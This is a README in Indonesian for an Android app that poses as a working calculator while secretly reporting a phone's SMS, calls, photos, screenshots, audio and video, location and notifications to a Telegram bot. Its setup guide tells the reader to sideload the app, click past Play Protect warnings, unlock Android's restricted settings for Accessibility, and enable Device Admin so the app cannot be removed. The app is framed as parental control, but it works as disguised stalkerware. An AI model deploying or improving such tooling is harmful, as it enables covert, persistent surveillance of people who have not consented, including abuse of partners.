<div align="center">

# Red Eye Mobile

**Aplikasi monitoring HP anak via Telegram, tampilannya kalkulator biasa.**

[![Build APK](https://github.com/tasirin1/Red-Eye-Mobile/actions/workflows/build.yml/badge.svg)](https://github.com/tasirin1/Red-Eye-Mobile/actions/workflows/build.yml)
[![Rilis terbaru](https://img.shields.io/github/v/release/tasirin1/Red-Eye-Mobile)](https://github.com/tasirin1/Red-Eye-Mobile/releases)
[![Lisensi: MIT](https://img.shields.io/badge/lisensi-MIT-green.svg)](LICENSE)

</div>

Buat orang tua memantau HP anaknya sendiri — bukan buat iseng. Dari luar, aplikasi ini kalkulator yang benar-benar berfungsi; di baliknya, orang tua menerima laporan dan bisa memberi perintah lewat bot Telegram.

> Build JANGAN lokal. Semua APK dibangun di GitHub Actions.
> `builder.sh` / `builder.bat` itu LEGACY dan sudah dihentikan — kalau dijalankan, keduanya berhenti sendiri tanpa mengubah berkas apa pun.
>
> Panduan langkah demi langkah, FAQ, dan skenario harian ada di [Wiki](https://github.com/tasirin1/Red-Eye-Mobile/wiki).

## Daftar Isi

- [Fitur](#fitur)
- [Ambil APK-nya](#ambil-apk-nya)
- [Bikin Bot Telegram](#bikin-bot-telegram)
- [Pasang & Setup](#pasang--setup)
- [Perintah Telegram](#perintah-telegram)
- [Kalau Error](#kalau-error)
- [Aturan Main](#aturan-main)
- [Lisensi & Legal](#lisensi--legal)

## Fitur

**Pemantauan & media**

- Log SMS & panggilan, foto berkala/manual, screenshot, rekam audio & video kamera

**Lokasi & pola harian**

- Lokasi + jejak, geofence rumah/sekolah, jam malam, digest harian/mingguan, skor waspada

**Notifikasi & aplikasi**

- Teruskan notifikasi HP anak ke Telegram; ringkasan pemakaian layar per aplikasi (`/layar`)
- Kabar aplikasi dipasang/dihapus

**Ketahanan, keamanan & cadangan**

- Anti-mati (hidup lagi sendiri habis reboot atau dibunuh sistem), proteksi uninstall via Device Admin
- Antrean offline: pesan dikirim begitu online lagi; masking OTP/bank otomatis
- Backup/pulihkan setelan terenkripsi (file `.redeyebak`), termasuk pulihkan lewat bot (`/pulihkan`) dan mode restore ketat berkode 6 digit
- Akses owner aman: link pairing dari Setup, atau `/login <PIN>`; `/logout` mengunci semua perintah sampai login lagi

## Ambil APK-nya

**Pengguna biasa:** unduh APK terbaru dari halaman [Releases](https://github.com/tasirin1/Red-Eye-Mobile/releases) — ambil `redeye-vX.Y.Z-release.apk`.

Bagi pengelola repo, APK diterbitkan dengan dua cara:

1. Cara rilis: `push` tag `vX.Y.Z` → muncul di halaman Releases sebagai `redeye-vX.Y.Z-debug.apk` dan `redeye-vX.Y.Z-release.apk` (signed; wajib keystore rilis di Secrets, kalau tidak build tag gagal tegas).
2. Cara coba cepat: tab Actions > Build APK > Run workflow (atau `push` ke `main`) → unduh dari artifacts `apks`: `redeye-debug.apk` + `redeye-release.apk` (tanpa keystore rilis, varian release memakai debug key).

Secret opsional (Settings > Secrets and variables > Actions): `SYNC_INTERVAL` (interval sync menit, default `5`), `ANDROID_KEYSTORE_BASE64`, `KEYSTORE_PASSWORD`, `KEY_ALIAS`, `KEY_PASSWORD`. Tanpa secret pun build tetap jalan. Token bot TIDAK pernah dibake ke APK — selalu diisi manual di aplikasi.

## Bikin Bot Telegram

1. Chat ke @BotFather, kirim `/newbot`, ikuti langkahnya, simpan tokennya.
2. Chat ke @userinfobot buat ambil ID Telegram kamu — itu Chat ID-nya.

## Pasang & Setup

1. Copy APK ke HP anak, install dari file manager (izinkan install dari sumber tak dikenal; kalau Play Protect protes, Details > Install anyway).
2. Buka aplikasinya — tampil sebagai kalkulator dan kalkulatornya beneran berfungsi. Ketik `1234` lalu tekan `=` untuk membuka halaman Setup.
3. Isi token bot, Chat ID, PIN akses bot (opsional, 6–12 digit), dan interval sync → tap Save, lalu Test Connection.
4. Tap Grant all permissions sampai semua hijau, termasuk background location (Allow all the time). Nyalakan akses notifikasi kalau mau forward notifikasi.
5. Biar `/screenshot` tahan restart: tap Aktifkan Aksesibilitas dan nyalakan layanan aplikasi ini sekali saja. Di Android 13+, aplikasi sideload diblokir dulu — buka Info aplikasi → menu tiga titik → Izinkan setelan terbatas.
6. Tap Anti-kill & Autostart: izinkan autostart merek HP, matikan batasan baterai. Nyalakan Device Admin kalau perlu proteksi uninstall.
7. Opsional: tap Salin link pairing dan buka link-nya dari akun Telegram owner; atau login dari chat bot dengan `/login <PIN>`.
8. Tap Enable monitoring. Selesai — cek lewat Send Status.

## Perintah Telegram

Dikirim dari akun owner yang sudah pairing/login. Daftar lengkap perintah + tombol interaktifnya ada di `/help` di dalam bot. Yang paling sering dipakai:

| Perintah | Fungsi |
|---|---|
| `/photo`, `/screenshot` | Foto / screenshot sekarang |
| `/location`, `/jejak` | Lokasi terakhir / jejak + rute peta |
| `/lastcalls`, `/lastsms` | 5 panggilan / SMS terakhir |
| `/lastnotif` | 10 notifikasi terakhir |
| `/layar` | Ringkasan pemakaian layar per aplikasi |
| `/status`, `/battery`, `/alive` | Status monitoring, baterai, denyut service |
| `/darurat` | Lokasi + foto + baterai sekaligus |
| `/digest`, `/minggu` | Ringkasan harian / laporan 7 hari |
| `/stop`, `/resume` | Jeda / lanjut monitoring |

## Kalau Error

| Gejala | Obatnya |
|---|---|
| Play Protect blokir | Install anyway |
| Sepi, tidak ada pesan | Test Connection ulang, cek token/Chat ID, lalu Send Status |
| Monitoring mati | Cek izin + matikan optimasi baterai + Anti-kill & Autostart; cek `/alive`, `/cekmati`, atau `/sembuh` |
| `/screenshot` selalu gagal | Nyalakan Aktifkan Aksesibilitas di Setup (tahan reboot); Capture Screen biasa hangus tiap reboot |
| Android 13+ blokir Aksesibilitas/notifikasi | Info aplikasi → menu tiga titik → Izinkan setelan terbatas |
| Tidak bisa uninstall | Matikan Device Admin dulu di Settings |

## Aturan Main

- Jangan build lokal pakai SDK; jangan `commit` secret (token bot/Chat ID hanya diisi manual di Setup).
- Ubah perilaku/build/workflow wajib catat di `CHANGELOG.md`.
- Detail aturan kontributor ada di `AGENTS.md`.

## Lisensi & Legal

Lisensi MIT, lihat `LICENSE`.
Berdasarkan Red Eye Mobile karya Akhatkulov (MIT); modifikasi © 2026 Julius rudy tasirin.

Khusus monitoring legal orang tua ke HP anak sendiri. Jangan buat mata-matain orang lain. Patuhi hukum setempat. Salah pakai tanggung jawab sendiri.
